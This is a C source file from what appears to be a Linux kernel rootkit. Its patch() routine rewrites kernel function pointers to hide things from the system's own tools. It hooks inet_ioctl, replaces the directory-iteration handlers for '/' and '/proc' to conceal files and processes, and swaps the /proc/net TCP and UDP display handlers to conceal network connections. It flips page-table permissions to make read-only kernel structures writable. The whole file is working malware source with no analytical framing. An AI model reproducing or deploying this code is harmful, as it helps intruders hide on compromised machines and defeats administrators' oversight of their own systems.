#include <net/tcp.h>
#include <net/udp.h>

#include <linux/in.h>
#include <linux/types.h>
#include <linux/socket.h>
#include <linux/string.h>
#include <linux/proc_fs.h>

/* include */
#include "iterate.h"

/* hook */
#include "pte.h"
#include "patch.h"
#include "get_op.h"
#include "sym_map.h"

static void _patch_inet_ioctl(const uint8_t flag)
{
        struct socket    *sock = NULL;
        struct proto_ops *sock_ops;

        if ((sock_ops = get_sop(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock)) == NULL)
                return;

        if (sym_map.old->inet_ioctl == NULL)
                sym_map.old->inet_ioctl = sock_ops->ioctl;

        //
        pte_change_perm((void *)sock_ops);

        //
        sock_ops->ioctl = (flag) ? sym_map.new->inet_ioctl:
                                   sym_map.old->inet_ioctl;
        //
        pte_change_perm((void *)sock_ops);

        //
        sock_release(sock);
};

static void _patch_root_iterate(const uint8_t flag)
{
        struct file_operations *f_op;

        if ((f_op = get_fop("/")) == NULL)
                return;

        if (sym_map.old->root_iterate == NULL)
                sym_map.old->root_iterate = f_op->ITERATE_NAME;

        //
        pte_change_perm((void *)f_op);

        //
        f_op->ITERATE_NAME = (flag) ? (sym_map.new->root_iterate):
                                      (sym_map.old->root_iterate);
        //
        pte_change_perm((void *)f_op);
}

static void _patch_proc_iterate(const uint8_t flag)
{
        struct file_operations *f_op;

        if ((f_op = get_fop("/proc")) == NULL)
                return;

        if (sym_map.old->proc_iterate == NULL)
                sym_map.old->proc_iterate = f_op->ITERATE_NAME;

        //
        pte_change_perm((void *)f_op);

        //
        f_op->ITERATE_NAME = (flag) ? (sym_map.new->proc_iterate):
                                      (sym_map.old->proc_iterate);
        //
        pte_change_perm((void *)f_op);
}

static void _patch_udp4_seq_show(const uint8_t flag)
{
        struct udp_seq_afinfo *afinfo;

        if ((afinfo = get_udp_afinfo("/proc/net/udp")) == NULL)
                return;

        if (sym_map.old->udp4_seq_show == NULL)
                sym_map.old->udp4_seq_show = afinfo->seq_ops.show;

        //
        afinfo->seq_ops.show = (flag) ? (sym_map.new->udp4_seq_show):
                                        (sym_map.old->udp4_seq_show);
}

static void _patch_udp6_seq_show(const uint8_t flag)
{
        struct udp_seq_afinfo *afinfo;

        if ((afinfo = get_udp_afinfo("/proc/net/udp6")) == NULL)
                return;

        if (sym_map.old->udp6_seq_show == NULL)
                sym_map.old->udp6_seq_show = afinfo->seq_ops.show;

        //
        afinfo->seq_ops.show = (flag) ? (sym_map.new->udp6_seq_show):
                                        (sym_map.old->udp6_seq_show);
}

static void _patch_tcp4_seq_show(const uint8_t flag)
{
        struct tcp_seq_afinfo *afinfo;

        if ((afinfo = get_tcp_afinfo("/proc/net/tcp")) == NULL)
                return;

        if (sym_map.old->tcp4_seq_show == NULL)
                sym_map.old->tcp4_seq_show = afinfo->seq_ops.show;

        //
        afinfo->seq_ops.show = (flag) ? (sym_map.new->tcp4_seq_show):
                                        (sym_map.old->tcp4_seq_show);
}

static void _patch_tcp6_seq_show(const uint8_t flag)
{
        struct tcp_seq_afinfo *afinfo;

        if ((afinfo = get_tcp_afinfo("/proc/net/tcp6")) == NULL)
                return;

        if (sym_map.old->tcp6_seq_show == NULL)
                sym_map.old->tcp6_seq_show = afinfo->seq_ops.show;

        //
        afinfo->seq_ops.show = (flag) ? (sym_map.new->tcp6_seq_show):
                                        (sym_map.old->tcp6_seq_show);
}

// patch funciton table
static void (*_patch_ft[])(const uint8_t flag) = {
        (void *)_patch_inet_ioctl,
        (void *)_patch_root_iterate,
        (void *)_patch_proc_iterate,
        (void *)_patch_udp4_seq_show,
        (void *)_patch_udp6_seq_show,
        (void *)_patch_tcp4_seq_show,
        (void *)_patch_tcp6_seq_show,
};

void patch(const uint8_t flag)
{
        uint8_t i;

        for (i = 0; i < SYM_NUM; i++)
                _patch_ft[i](flag);
}

